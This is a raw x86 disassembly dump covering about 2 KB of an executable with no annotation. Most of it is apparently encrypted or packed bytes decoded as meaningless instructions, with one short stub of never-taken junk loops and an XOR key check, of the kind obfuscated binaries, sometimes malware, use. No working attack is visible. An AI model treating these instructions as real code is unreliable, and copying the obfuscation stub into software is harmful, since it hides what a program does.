  40c66a:	cmp    eax,0x72b5be5f
  40c66f:	inc    edx
  40c670:	out    0xe4,al
  40c672:	add    DWORD PTR [eax-0x1d7a3c61],0xffffff8b
  40c679:	adc    BYTE PTR [esi-0x5c0f8a5a],dl
  40c67f:	int    0xb2
  40c681:	leave  
  40c682:	pop    ebp
  40c683:	(bad)  
  40c684:	cli    
  40c685:	inc    edi
  40c686:	or     ah,BYTE PTR [edi]
  40c688:	in     al,0x73
  40c68a:	or     BYTE PTR [edi+eiz*4+0x1221137f],al
  40c691:	je     0x40c6ea
  40c693:	and    al,0x7d
  40c695:	pop    esp
  40c696:	leave  
  40c697:	js     0x40c6b7
  40c699:	out    0xc6,eax
  40c69b:	ret    
  40c69c:	inc    esi
  40c69d:	push   ebp
  40c69e:	or     ecx,DWORD PTR [eax-0x13851c0]
  40c6a4:	test   eax,0x18687352
  40c6a9:	dec    ecx
  40c6aa:	call   0xc294:0x1aab25ae
  40c6b1:	leave  
  40c6b2:	aad    0xd7
  40c6b4:	sub    al,0x3f
  40c6b6:	jl     0x40c675
  40c6b8:	leave  
  40c6b9:	jne    0x40c724
  40c6bb:	(bad)  
  40c6bc:	(bad)  
  40c6bd:	cli    
  40c6be:	nop
  40c6bf:	retf   
  40c6c0:	test   BYTE PTR [ecx+eax*2+0x12],al
  40c6c4:	cmovp  ebx,ebx
  40c6c7:	fistp  WORD PTR [ebx]
  40c6c9:	xchg   DWORD PTR [ebp+0x6d],edx
  40c6cc:	retf   0x551d
  40c6cf:	fadd   DWORD PTR [ecx-0x77]
  40c6d2:	je     0x40c6dd
  40c6d4:	outs   dx,BYTE PTR ds:[esi]
  40c6d5:	pop    ecx
  40c6d6:	(bad)  
  40c6d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6d8:	xchg   ecx,eax
  40c6d9:	(bad)  
  40c6da:	(bad)  
  40c6db:	adc    al,0xcd
  40c6dd:	xor    ecx,edi
  40c6df:	mov    ecx,0x4971338e
  40c6e4:	push   esp
  40c6e5:	dec    edx
  40c6e6:	mov    ds:0xbfd3aa74,eax
  40c6eb:	les    edx,FWORD PTR [ecx]
  40c6ed:	lock clc 
  40c6ef:	adc    BYTE PTR [eax],0x4b
  40c6f2:	mov    ecx,0x2b471cd5
  40c6f7:	popa   
  40c6f8:	mov    esi,0x4e321a7b
  40c6fd:	inc    edi
  40c6fe:	loopne 0x40c6f3
  40c700:	test   DWORD PTR [ecx+0x49],0x18973a62
  40c707:	mov    ch,0xaa
  40c709:	jbe    0x40c6d9
  40c70b:	neg    BYTE PTR [edx+0x58]
  40c70e:	aam    0x0
  40c710:	mov    ebx,0x6eb243ef
  40c715:	lea    esp,[esi]
  40c717:	(bad)  
  40c718:	jne    0x40c6e7
  40c71a:	xchg   ebx,eax
  40c71b:	xchg   ebx,eax
  40c71c:	lods   al,BYTE PTR gs:[esi]
  40c71e:	imul   esp,DWORD PTR [ebp+0x62579b3],0x222d2274
  40c728:	jg     0x40c7a9
  40c72a:	out    0x51,eax
  40c72c:	xchg   esp,eax
  40c72d:	inc    edx
  40c72e:	jns    0x40c75f
  40c730:	jno    0x40c6fe
  40c732:	sbb    DWORD PTR [esi],0x8f5f40dd
  40c738:	xor    al,0x7f
  40c73a:	test   BYTE PTR [ebp-0x6d],ah
  40c73d:	cmp    BYTE PTR [esi+0x22022d4f],cl
  40c743:	sub    al,0x53
  40c745:	inc    ebx
  40c746:	jbe    0x40c7a3
  40c748:	repnz xor ecx,esi
  40c74b:	dec    ecx
  40c74c:	cmp    BYTE PTR cs:[edi+0x39de1622],bh
  40c753:	repz js 0x40c785
  40c756:	icebp  
  40c757:	mov    esp,0x16acb3c1
  40c75c:	ins    BYTE PTR es:[edi],dx
  40c75d:	(bad)  
  40c75e:	jle    0x40c76b
  40c760:	push   esi
  40c761:	xchg   esi,eax
  40c762:	sbb    bl,BYTE PTR [edx+0x64]
  40c765:	paddd  mm6,QWORD PTR [ebx-0x24]
  40c769:	pop    esp
  40c76a:	mov    ?,esp
  40c76c:	add    BYTE PTR [ebp+0x59],ch
  40c76f:	dec    ecx
  40c770:	cmp    ecx,DWORD PTR [esp+edx*8+0x2edbf020]
  40c777:	mov    ds:0x7bda4097,al
  40c77c:	push   ss
  40c77d:	stc    
  40c77e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c77f:	cmp    ebp,DWORD PTR [edx+0x729c05f5]
  40c785:	xor    al,BYTE PTR [eax]
  40c787:	leave  
  40c788:	ret    0x4
  40c78b:	push   ebp
  40c78c:	mov    ebp,esp
  40c78e:	mov    eax,ds:0x416224
  40c793:	mov    edx,0x32729c
  40c798:	and    DWORD PTR ds:0x434272,edi
  40c79e:	sub    eax,edx
  40c7a0:	and    DWORD PTR ds:0x432600,0x0
  40c7aa:	jmp    0x40c7bc
  40c7af:	mov    ecx,DWORD PTR ds:0x432600
  40c7b5:	inc    ecx
  40c7b6:	mov    DWORD PTR ds:0x432600,ecx
  40c7bc:	cmp    DWORD PTR ds:0x432600,0x1c
  40c7c3:	jae    0x40c8aa
  40c7c9:	cmp    DWORD PTR ds:0x432600,0x21
  40c7d0:	jne    0x40c7e4
  40c7d6:	push   0x432cc2
  40c7db:	push   DWORD PTR [ebp-0x1c]
  40c7de:	call   DWORD PTR ds:0x432c1e
  40c7e4:	jmp    0x40c7af
  40c7e9:	and    DWORD PTR ds:0x434286,0x0
  40c7f3:	jmp    0x40c805
  40c7f8:	mov    ecx,DWORD PTR ds:0x434286
  40c7fe:	inc    ecx
  40c7ff:	mov    DWORD PTR ds:0x434286,ecx
  40c805:	cmp    DWORD PTR ds:0x434286,0x1a
  40c80c:	jae    0x40c8aa
  40c812:	cmp    DWORD PTR ds:0x434286,0x9
  40c819:	jne    0x40c82d
  40c81f:	push   0x43431d
  40c824:	push   DWORD PTR [ebp-0x24]
  40c827:	call   DWORD PTR ds:0x4328ea
  40c82d:	cmp    DWORD PTR ds:0x434286,0x8
  40c834:	jne    0x40c847
  40c83a:	mov    ecx,DWORD PTR ds:0x434286
  40c840:	inc    ecx
  40c841:	mov    DWORD PTR ds:0x434286,ecx
  40c847:	jmp    0x40c7f8
  40c84c:	mov    DWORD PTR ds:0x4342a2,0x1c
  40c856:	cmp    DWORD PTR ds:0x4342a2,0x0
  40c85d:	je     0x40c8aa
  40c863:	cmp    DWORD PTR ds:0x4342a2,0xf
  40c86a:	jne    0x40c87c
  40c870:	push   DWORD PTR [ebp-0x14]
  40c873:	push   DWORD PTR [ebp-0x20]
  40c876:	call   DWORD PTR ds:0x432b66
  40c87c:	cmp    DWORD PTR ds:0x4342a2,0x10
  40c883:	jne    0x40c898
  40c889:	xor    ecx,ecx
  40c88b:	xor    ecx,DWORD PTR ds:0x4342a2
  40c891:	dec    ecx
  40c892:	mov    DWORD PTR ds:0x4342a2,ecx
  40c898:	mov    ecx,DWORD PTR ds:0x4342a2
  40c89e:	dec    ecx
  40c89f:	mov    DWORD PTR ds:0x4342a2,ecx
  40c8a5:	jmp    0x40c856
  40c8aa:	mov    ecx,0x7510855
  40c8af:	push   esi
  40c8b0:	mov    esi,DWORD PTR [ebp+0xc]
  40c8b3:	xor    eax,ecx
  40c8b5:	cmp    eax,esi
  40c8b7:	je     0x40d05a
  40c8bd:	mov    eax,ds:0x41621c
  40c8c2:	mov    esi,DWORD PTR [ebp+0xc]
  40c8c5:	sub    eax,edx
  40c8c7:	xor    eax,ecx
  40c8c9:	jmp    0x40cb3d
  40c8ce:	xchg   edi,eax
  40c8cf:	rol    DWORD PTR ds:0xb5744198,1
  40c8d5:	icebp  
  40c8d6:	lods   al,BYTE PTR ds:[esi]
  40c8d7:	add    al,0x98
  40c8d9:	sar    DWORD PTR [esi+0x737b9102],0x85
  40c8e0:	jo     0x40c952
  40c8e2:	leave  
  40c8e3:	jle    0x40c955
  40c8e5:	jo     0x40c93c
  40c8e7:	sahf   
  40c8e8:	loopne 0x40c8c2
  40c8ea:	cld    
  40c8eb:	inc    esi
  40c8ec:	shl    ebp,1
  40c8ee:	fisub  WORD PTR [ecx]
  40c8f0:	(bad)  
  40c8f2:	(bad)  
  40c8f4:	imul   esi,DWORD PTR gs:[eax-0x25],0xe1f323
  40c8fc:	into   
  40c8fd:	cmp    eax,0x4f9440b4
  40c902:	jl     0x40c893
  40c904:	shr    DWORD PTR [eax],1
  40c906:	ja     0x40c955
  40c908:	imul   esi,eax,0xffffffc1
  40c90b:	jns    0x40c961
  40c90d:	jp     0x40c981
  40c90f:	outs   dx,DWORD PTR ds:[esi]
  40c910:	dec    edx
  40c911:	mov    WORD PTR [ecx-0x2c],cs
  40c914:	arpl   WORD PTR [edi+edi*4-0x41],cx
  40c918:	inc    eax
  40c919:	in     eax,dx
  40c91a:	(bad)  
  40c91b:	sbb    eax,0xacbe7115
  40c920:	pop    esp
  40c921:	out    0x7d,eax
  40c923:	dec    esp
  40c924:	push   es
  40c925:	imul   ebx,DWORD PTR ds:0xf98623e8,0x5d
  40c92c:	test   BYTE PTR [esi+eax*8],0x72
  40c930:	retf   0xcd2c
  40c933:	and    DWORD PTR [edx],0xffffffb5
  40c936:	dec    ecx
  40c937:	add    al,BYTE PTR [edx-0x2]
  40c93a:	or     eax,0xf4aace11
  40c93f:	sbb    BYTE PTR [ebp-0x5c],bl
  40c942:	int    0xd3
  40c944:	lds    esp,FWORD PTR [eax-0x2f]
  40c947:	daa    
  40c948:	sbb    ecx,DWORD PTR [ebx+0x5b]
  40c94b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c94c:	or     BYTE PTR [eax+0x4e12b99e],bh
  40c952:	shl    BYTE PTR gs:[eax+0x70b4b2de],1
  40c959:	inc    ecx
  40c95a:	xor    ah,bl
  40c95c:	(bad)  
  40c95d:	(bad)  
  40c95e:	mov    ecx,0x1b8395a3
  40c963:	xchg   esp,eax
  40c964:	and    dh,BYTE PTR [ebp+0x4f1e2608]
  40c96a:	xchg   ecx,eax
  40c96b:	cmp    DWORD PTR [esi-0x11],eax
  40c96e:	sbb    DWORD PTR ds:0x79f4cd8a,ecx
  40c974:	enter  0x385b,0x7c
  40c978:	(bad)  [esi-0x10]
  40c97b:	mov    ebp,0x1e7441d8
  40c980:	jecxz  0x40c942
  40c982:	mov    DWORD PTR [eax],esi
  40c984:	mov    DWORD PTR [ebp-0x57],edi
  40c987:	jnp    0x40c9b9
  40c989:	arpl   WORD PTR [eax+0x55],bx
  40c98c:	xor    al,0x35
  40c98e:	lahf   
  40c98f:	fisttp QWORD PTR [ebp-0x6d]
  40c992:	cdq    
  40c993:	cmc    
  40c994:	fdiv   QWORD PTR [ebp-0x7e32ab83]
  40c99a:	es push ebx
  40c99c:	(bad)  
  40c99d:	std    
  40c99e:	stc    
  40c99f:	iret   
  40c9a0:	imul   edi,DWORD PTR [edi-0x58b6cabe],0x45b2d78b
  40c9aa:	(bad)  
  40c9ab:	xor    ch,BYTE PTR [ebp+0x5e95313e]
  40c9b1:	sbb    DWORD PTR [edx-0x70],0x4d
  40c9b5:	sbb    al,0xe9
  40c9b7:	xor    ah,BYTE PTR [eax-0x47c87385]
  40c9bd:	popf   
  40c9be:	std    
  40c9bf:	add    cl,BYTE PTR [ebx+0x2d]
  40c9c2:	dec    esi
  40c9c3:	cmc    
  40c9c4:	rcr    DWORD PTR [ecx+0x4c],0xf0
  40c9c8:	xchg   esp,eax
  40c9c9:	imul   BYTE PTR [ecx-0x40]
  40c9cc:	in     al,dx
  40c9cd:	clc    
  40c9ce:	mov    esp,0x35b0e092
  40c9d3:	jmp    0xf150cc15
  40c9d8:	inc    edi
  40c9d9:	jmp    0x40c9dd
  40c9db:	dec    ecx
  40c9dc:	inc    edi
  40c9dd:	dec    ebx
  40c9de:	gs adc al,0x70
  40c9e1:	xor    DWORD PTR [ecx+edx*1-0x2772ae6],ebx
  40c9e8:	in     al,0xff
  40c9ea:	cmc    
  40c9eb:	mov    ecx,0xb78fd89f
  40c9f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9f1:	js     0x40ca6d
  40c9f3:	jbe    0x40c9e3
  40c9f5:	test   eax,ecx
  40c9f7:	pop    edx
  40c9f8:	pop    ebp
  40c9f9:	pop    edi
  40c9fa:	pop    ds
  40c9fb:	xchg   ebx,eax
  40c9fc:	mov    ch,0xa3
  40c9fe:	fwait
  40c9ff:	test   eax,0x954b4a0c
  40ca04:	pop    eax
  40ca05:	or     al,0x1f
  40ca07:	sar    BYTE PTR [edi+ebx*2-0x62],1
  40ca0b:	fst    QWORD PTR [eax+0x3f]
  40ca0e:	mov    ecx,0x42997011
  40ca13:	dec    esp
  40ca14:	push   cs
  40ca15:	and    eax,DWORD PTR [edx-0x2d]
  40ca18:	jns    0x40c9e1
  40ca1a:	pop    edx
  40ca1b:	push   ecx
  40ca1c:	jno    0x40ca23
  40ca1e:	repz lds esp,FWORD PTR [esi-0x57]
  40ca22:	in     eax,dx
  40ca23:	call   0x32d5046
  40ca28:	aam    0x78
  40ca2a:	sti    
  40ca2b:	in     al,0xfb
  40ca2d:	cmp    al,0xeb
  40ca2f:	jmp    0x40ca11
  40ca31:	inc    eax
  40ca32:	or     BYTE PTR [eax],bl
  40ca34:	mov    DWORD PTR [esp+edi*4],ebx
  40ca37:	outs   dx,BYTE PTR ds:[esi]
  40ca38:	mov    ebx,0x79037867
  40ca3d:	lock or al,0xcd
  40ca40:	call   FWORD PTR [ebp+edi*1-0x5b555389]
  40ca47:	adc    dl,BYTE PTR [ebp-0x69bc7a44]
  40ca4d:	sbb    eax,0x365d727
  40ca52:	cmp    esp,ebp
  40ca54:	scas   eax,DWORD PTR es:[edi]
  40ca55:	jge    0x40cac5
  40ca57:	(bad)  
  40ca58:	push   cs
  40ca59:	sub    ch,BYTE PTR ds:0x849eea02
  40ca5f:	add    bl,bl
  40ca61:	dec    esp
  40ca62:	lea    ebx,[ebx]
  40ca64:	inc    ebp
  40ca65:	jne    0x40cad2
  40ca67:	xchg   ecx,esp
  40ca69:	push   eax
  40ca6a:	xor    DWORD PTR [ecx+0x32],edi
  40ca6d:	xlat   BYTE PTR ds:[ebx]
  40ca6e:	xor    BYTE PTR [ebx+edx*1],bh
  40ca71:	and    al,0x14
  40ca73:	(bad)  
  40ca75:	dec    ebp
  40ca76:	hlt    
  40ca77:	imul   ebp,DWORD PTR [ebx-0x80],0xe9f199e7
  40ca7e:	ja     0x40ca12
  40ca80:	lock or BYTE PTR [ebx-0x695a3a0],cl
  40ca87:	inc    edi
  40ca88:	in     eax,dx
  40ca89:	or     eax,0x69cec10a
  40ca8e:	inc    edi
  40ca8f:	lea    esi,[edi]
  40ca91:	fwait
  40ca92:	int    0x41
  40ca94:	sbb    ebp,DWORD PTR [ebx+0x6f]
  40ca97:	xchg   ecx,eax
  40ca98:	aad    0x20
  40ca9a:	mov    dh,0xde
  40ca9c:	and    BYTE PTR [eax-0x57],dl
  40ca9f:	sub    ecx,0xbef25617
  40caa5:	pop    edi
  40caa6:	shl    BYTE PTR [ecx],cl
  40caa8:	jmp    0x40cab6
  40caaa:	push   edx
  40caab:	(bad)  
  40caac:	rcl    dl,cl
  40caae:	addr16 pusha 
  40cab0:	(bad)  
  40cab1:	loopne 0x40cab4
  40cab3:	je     0x40cab2
  40cab5:	and    eax,0x6bdb398e
  40caba:	pop    ebx
  40cabc:	pop    es
  40cabd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cabe:	addr16 and bl,dh
  40cac1:	mov    bh,0xe7
  40cac3:	sbb    ebx,DWORD PTR [edx-0x307adc9d]
  40cac9:	and    DWORD PTR [esi+eiz*1-0x111077a9],0x56
  40cad1:	dec    edi
  40cad2:	call   0x77320128
  40cad7:	xchg   eax,ecx
  40cad9:	ja     0x40ca71
  40cadb:	inc    edx
  40cadc:	mov    esi,DWORD PTR [ebx+0x49df6f1f]
  40cae2:	jns    0x40cac9
  40cae4:	sub    al,0xc4
  40cae6:	xchg   ebp,eax
  40cae7:	mov    cs,WORD PTR [ecx-0x3c587214]
  40caed:	dec    ebp
  40caee:	std    
  40caef:	(bad)  
  40caf0:	pop    eax
  40caf1:	(bad)  
  40caf2:	fsubr  DWORD PTR [ebx-0x7f]
  40caf5:	mov    ecx,fs
  40caf7:	sbb    al,0x47
  40caf9:	mov    ds:0x11c74600,eax
  40cafe:	pop    ds
  40caff:	push   esp
  40cb00:	in     eax,dx
  40cb01:	out    dx,al
  40cb02:	retf   
  40cb03:	aas    
  40cb04:	fisttp DWORD PTR [ebp-0x6232335f]
  40cb0a:	add    BYTE PTR [ebp-0x4c],dh
  40cb0d:	mov    ebx,0x4735f2bf
  40cb12:	and    bl,BYTE PTR [edx-0xc]
  40cb15:	push   ebx
  40cb16:	mov    eax,ds:0x4d0c0541
  40cb1b:	aam    0xb2
  40cb1d:	loope  0x40cb66
  40cb1f:	addr16 test al,0x75
  40cb22:	cwde   
  40cb23:	sbb    DWORD PTR [edi-0x19216198],esp
  40cb29:	mov    bl,0x8f
  40cb2b:	mov    al,ds:0x28b0e2fa
  40cb30:	push   0xffffff95
  40cb32:	mov    bl,0x4b
  40cb34:	xchg   esp,eax
  40cb35:	xchg   ecx,eax
  40cb36:	mov    ch,BYTE PTR [edi-0x3863e271]
  40cb3c:	fdivr  DWORD PTR [ebx]
  40cb3e:	(bad)  
  40cb3f:	jne    0x40cb55
  40cb45:	mov    eax,ds:0x416224
  40cb4a:	add    eax,DWORD PTR ds:0x41621c
  40cb50:	jmp    0x40d044
  40cb55:	mov    eax,DWORD PTR [ebp+0xc]
  40cb58:	xor    eax,ecx
  40cb5a:	jmp    0x40cdce
  40cb5f:	pop    ecx
  40cb60:	scas   al,BYTE PTR es:[edi]
  40cb61:	sbb    BYTE PTR [ebx-0xd],al
  40cb64:	push   ecx
  40cb65:	pop    ecx
  40cb66:	mov    dh,0xd4
  40cb68:	(bad)
  40cb6b:	sar    DWORD PTR [edx-0x7d33b450],1
  40cb71:	jo     0x40cbe3
  40cb73:	leave  
  40cb74:	jle    0x40cbe6
  40cb76:	jo     0x40cba8
  40cb78:	adc    al,0xb
  40cb7a:	pop    ss
  40cb7b:	aas    
  40cb7c:	add    eax,0xd1724a7d
  40cb81:	loope  0x40cbe6
  40cb83:	repz xchg esp,eax
  40cb85:	pop    ecx
  40cb86:	add    ah,dl
  40cb88:	or     DWORD PTR [ecx+0x6e0f82ed],edx
  40cb8e:	and    DWORD PTR [eax-0x22f4f9eb],0x60
  40cb95:	xor    al,BYTE PTR [ecx]
  40cb97:	and    eax,0x9296c600
  40cb9c:	sti    
  40cb9d:	or     edx,DWORD PTR [esp+esi*8+0x6f]
  40cba1:	pop    edx
  40cba2:	push   edx
  40cba3:	mov    ebx,0x188ebb22
  40cba8:	in     al,dx
  40cba9:	pusha  
  40cbaa:	sar    bl,0x3d
  40cbad:	scas   al,BYTE PTR es:[edi]
  40cbae:	mov    ebx,0xac1b65c0
  40cbb3:	loope  0x40cbc9
  40cbb5:	xchg   ecx,eax
  40cbb6:	xchg   ecx,eax
  40cbb7:	cmp    bl,BYTE PTR [eax]
  40cbb9:	jecxz  0x40cc3a
  40cbbb:	jp     0x40cb3d
  40cbbd:	and    DWORD PTR [eax+0xc],ecx
  40cbc0:	xor    dl,al
  40cbc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbc3:	add    al,0x36
  40cbc5:	cdq    
  40cbc6:	and    cl,ah
  40cbc8:	retf   0x4340
  40cbcb:	push   ebx
  40cbcc:	data16 cli 
  40cbce:	test   DWORD PTR [edx-0x33],0x8b7f3a54
  40cbd5:	gs (bad) 
  40cbd7:	fld    QWORD PTR [ebx]
  40cbd9:	call   0xb29:0x5aa2ca3f
  40cbe0:	ret    
  40cbe1:	xor    esp,DWORD PTR [ebx-0xa]
  40cbe4:	mov    eax,ds:0xce6f3acf
  40cbe9:	dec    esp
  40cbea:	cmp    bl,BYTE PTR [esi]
  40cbec:	stc    
  40cbed:	retf   
  40cbee:	addr16 ret 
  40cbf0:	push   ds
  40cbf1:	(bad)  ds:0xbebc815d
  40cbf7:	inc    ebx
  40cbf8:	or     BYTE PTR [ebx-0x6ba69d40],0x4b
  40cbff:	pop    ecx
  40cc00:	sub    eax,0x3fd296f1
  40cc05:	push   0xfffffff5
  40cc07:	idiv   DWORD PTR [edx+0x41]
  40cc0a:	pop    esi
  40cc0b:	(bad)  
  40cc0c:	xchg   ebx,eax
  40cc0d:	mov    ecx,0x2a18eb7d
  40cc12:	xchg   DWORD PTR [ecx],esp
  40cc14:	leave  
  40cc15:	pop    ebx
  40cc16:	dec    edx
  40cc17:	or     ch,ch
  40cc19:	xor    BYTE PTR [ebx+0x6760cdb],bh
  40cc1f:	xchg   ecx,eax
  40cc20:	dec    edi
  40cc21:	mov    cl,0x80
  40cc23:	xchg   DWORD PTR [ecx-0x4a8e636d],eax
  40cc29:	and    esi,DWORD PTR [edx+0x2c]
  40cc2c:	sub    eax,0xf56837f5
  40cc31:	(bad)  
  40cc32:	push   ebp
  40cc33:	cs dec esp
  40cc35:	pop    ebx
  40cc36:	xchg   esi,eax
  40cc37:	jge    0x40cc2a
  40cc39:	cmp    al,0xb1
  40cc3b:	stos   DWORD PTR es:[edi],eax
  40cc3c:	out    dx,eax
  40cc3d:	dec    esi
  40cc3e:	pop    ecx
  40cc3f:	push   edx
  40cc40:	dec    edi
  40cc41:	xchg   BYTE PTR [eax-0x32],ah
  40cc44:	adc    ch,al
  40cc46:	pop    esp
  40cc47:	loop   0x40cbf6
  40cc49:	sub    DWORD PTR [eax-0x1e34c247],eax
  40cc4f:	addr16 sub edi,esi
  40cc52:	bnd jl 0x40cbf7
  40cc55:	dec    ebx
  40cc56:	jo     0x40cc3f
  40cc58:	(bad)
  40cc5c:	inc    ecx
  40cc5d:	jg     0x40ccb6
  40cc5f:	enter  0x741b,0x44
  40cc63:	into   
  40cc64:	fisttp DWORD PTR [edi-0x58]
  40cc67:	ret    0xe72d
  40cc6a:	sahf   
  40cc6b:	(bad)  
  40cc6c:	stc    
  40cc6d:	popa   
  40cc6e:	pop    ecx
  40cc6f:	push   edx
  40cc70:	or     edx,esi
  40cc72:	(bad)  
  40cc73:	loopne 0x40ccde
  40cc75:	push   eax
  40cc76:	mov    ecx,0x35c9b4cb
  40cc7b:	cmp    bl,BYTE PTR [eax]
  40cc7d:	jae    0x40cc7c
  40cc7f:	xchg   ebx,eax
  40cc80:	call   0x9efc0e63
  40cc85:	mov    edi,0xd4adcc5d
  40cc8a:	mov    esi,0xb5ece54d
  40cc8f:	pop    edx
  40cc90:	jae    0x40cc77
  40cc92:	in     eax,dx
  40cc93:	cmp    DWORD PTR [edi+0x237d9dc1],0xb59bda29
  40cc9d:	adc    DWORD PTR [edx],0x1a
  40cca0:	jmp    0xe94e:0x4a186ade
  40cca7:	call   0x4b33:0x96fbbeda
  40ccae:	sub    eax,0x5485899a
  40ccb3:	enter  0x1ada,0xbc
  40ccb7:	dec    esi
  40ccb8:	(bad)  [ebx+0xf3e4153]
  40ccbe:	repnz dec edi
  40ccc0:	sar    BYTE PTR [eax-0x633eb610],0xa8
  40ccc7:	adc    al,0xc1
  40ccc9:	push   ecx
  40ccca:	mov    edx,0x6aa50fd8
  40cccf:	xchg   ecx,eax
  40ccd0:	in     eax,0x16
  40ccd2:	stos   DWORD PTR es:[edi],eax
  40ccd3:	(bad)  
  40ccd4:	and    BYTE PTR [ecx],cl
  40ccd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccd7:	sar    BYTE PTR [edx-0x30],cl
  40ccda:	lahf   
  40ccdb:	pop    ebx
  40ccdc:	xchg   esi,eax
  40ccdd:	xor    BYTE PTR ds:0xe8c63355,0x6c
  40cce4:	(bad)  
  40cce5:	mov    ebp,0xb701488b
  40ccea:	jae    0x40cc9a
  40ccec:	push   ss
  40cced:	lea    edx,[edx-0x3d]
  40ccf0:	clc    
  40ccf1:	sub    al,0x10
  40ccf3:	add    bh,dh
  40ccf5:	shl    DWORD PTR [edi+0x27],0x75
  40ccf9:	fstp   DWORD PTR [edx-0x3a27028]
  40ccff:	xor    ch,BYTE PTR [edi-0x6e]
  40cd02:	mov    cl,0x2b
  40cd04:	push   ebp
  40cd05:	mov    esp,0x6e135f1a
  40cd0a:	push   es
  40cd0b:	out    0x1e,al
  40cd0d:	mov    ch,0xe6
  40cd0f:	mov    eax,DWORD PTR [edi]
  40cd11:	out    0xf5,al
  40cd13:	add    eax,0x2dc08119
  40cd18:	push   ds
  40cd19:	out    0x96,eax
  40cd1b:	int    0xa5
  40cd1d:	mov    cl,0x41
  40cd1f:	push   0xffffffa7
  40cd21:	std    
  40cd22:	mov    al,0xe4
  40cd24:	sub    al,0x3
  40cd26:	bound  edi,QWORD PTR [esi-0x31cce4f6]
  40cd2c:	int3   
  40cd2d:	rcr    BYTE PTR ds:0xa321e055,1
  40cd33:	dec    eax
  40cd34:	aad    0x25
  40cd36:	jp     0x40cd89
  40cd38:	fs out dx,al
  40cd3a:	lds    esi,FWORD PTR [esp+eax*2]
  40cd3d:	(bad)  
  40cd3f:	cld    
  40cd40:	and    bh,BYTE PTR [eax+eiz*1-0x7e]
  40cd44:	mov    cs,esi
  40cd46:	xor    bl,bh
  40cd48:	pop    esp
  40cd49:	mov    DWORD PTR [ecx+0x3fc2af0b],esp
  40cd4f:	jnp    0x40ccd8
  40cd51:	loopne 0x40cdc8
  40cd53:	xchg   DWORD PTR [ebx+0x3b895a99],ecx
  40cd59:	inc    esi
  40cd5a:	popa   
  40cd5b:	pop    ss
  40cd5c:	sti    
  40cd5d:	xchg   edx,eax
  40cd5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd5f:	(bad)  
  40cd60:	stc    
  40cd61:	push   esi
  40cd62:	fisubr WORD PTR [edx-0x6b]
  40cd65:	dec    esp
  40cd66:	push   esp
  40cd67:	cmc    
  40cd68:	xchg   ebx,eax
  40cd69:	sbb    cl,BYTE PTR [ebp-0x599152b9]
  40cd6f:	enter  0x8fcb,0xee
  40cd73:	sbb    al,0xe3
  40cd75:	pop    ecx
  40cd76:	js     0x40cde4
  40cd78:	test   BYTE PTR [ebx+0x43],al
  40cd7b:	inc    ecx
  40cd7c:	dec    esp
  40cd7d:	push   ebx
  40cd7e:	in     al,dx
  40cd7f:	jle    0x40cd56
  40cd81:	sbb    ebp,DWORD PTR [ebp+0x1f6297f2]
  40cd87:	adc    edx,DWORD PTR [eax]
  40cd89:	pop    eax
  40cd8a:	push   edx
  40cd8b:	js     0x40cdee
  40cd8d:	test   BYTE PTR [ebx],al
  40cd8f:	mov    ds:0x375c1977,al
  40cd94:	je     0x40cd48
  40cd96:	and    DWORD PTR [esi+0x604a4d1f],ebx
  40cd9c:	aam    0x6d
  40cd9e:	idiv   cl
  40cda0:	jne    0x40cd58
  40cda2:	fs scas al,BYTE PTR es:[edi]
  40cda4:	mov    cl,0xdb
  40cda6:	in     eax,0xee
  40cda8:	pop    ebp
  40cda9:	xor    ecx,DWORD PTR [ecx+0x116daf95]
  40cdaf:	std    
  40cdb0:	mov    BYTE PTR [edx],dh
  40cdb2:	sbb    esi,edi
  40cdb4:	lea    ebp,[ebp-0x27]
  40cdb7:	dec    ebx
  40cdb8:	adc    BYTE PTR [ebx+0x6dd16dc],dl
  40cdbe:	sub    esi,0xea1ee38b
  40cdc4:	arpl   WORD PTR [ebx+0x27],sp
  40cdc7:	fs mov edi,es
  40cdca:	js     0x40cdb2
  40cdcc:	scas   eax,DWORD PTR es:[edi]
  40cdcd:	sbb    DWORD PTR [ebx],eax
  40cdcf:	ret    0x6fe9
  40cdd2:	add    al,BYTE PTR [eax]
  40cdd4:	add    BYTE PTR [edi+0x4b],dh
  40cdd7:	and    eax,0x717221b4
  40cddc:	dec    ebx
  40cddd:	xchg   DWORD PTR [edx-0x73c56e42],eax
  40cde3:	psadbw mm4,QWORD PTR [ebp-0x368f8f80]
  40cdea:	jle    0x40ce5c
  40cdec:	jo     0x40cdd0
  40cdee:	sub    eax,0x91145e75
  40cdf3:	jmp    0x2e0ed3a7
  40cdf8:	mov    ds:0xbf65e6ff,al
  40cdfd:	jmp    0x40cdb6
  40cdff:	lea    edx,[ecx]
  40ce01:	cmp    eax,0x90bdbfb4
  40ce06:	in     al,0xb4
  40ce08:	xor    ebp,DWORD PTR [edi-0x74]
  40ce0b:	xlat   BYTE PTR ds:[ebx]
  40ce0c:	ins    BYTE PTR es:[edi],dx
  40ce0d:	fcomp  DWORD PTR [eax]
  40ce0f:	inc    esp
  40ce10:	xchg   BYTE PTR [ebp+ebx*8-0x4494ccd],dl
  40ce17:	xor    al,0xb9
  40ce19:	out    0xa3,al
  40ce1b:	push   ds
  40ce1c:	xor    DWORD PTR [edx-0x4b],ebx
  40ce1f:	out    0x7a,eax
  40ce21:	xchg   edx,eax
  40ce22:	aad    0x8f
  40ce24:	jmp    0xcff3:0xb6ece7b
  40ce2b:	xlat   BYTE PTR ds:[ebx]
  40ce2c:	push   esp
  40ce2d:	pop    es
  40ce2e:	xor    ebp,DWORD PTR [ecx-0x56]
  40ce31:	jmp    FWORD PTR es:[ecx-0x56db947e]
  40ce38:	dec    ebp
  40ce39:	or     al,0xb8
  40ce3b:	pop    ss
  40ce3c:	fild   QWORD PTR [ebx-0xe]
  40ce3f:	adc    cl,BYTE PTR [esp+edx*4-0x4b6c631]
  40ce46:	mov    esp,0x93069ab8
  40ce4b:	popa   
  40ce4c:	jbe    0x40ce60
  40ce4e:	ror    DWORD PTR [esi],cl
  40ce50:	cmp    BYTE PTR [ecx-0x10],dh
  40ce53:	and    BYTE PTR [edx+esi*4+0x3c],bh
  40ce57:	in     al,dx
  40ce58:	sub    ah,al
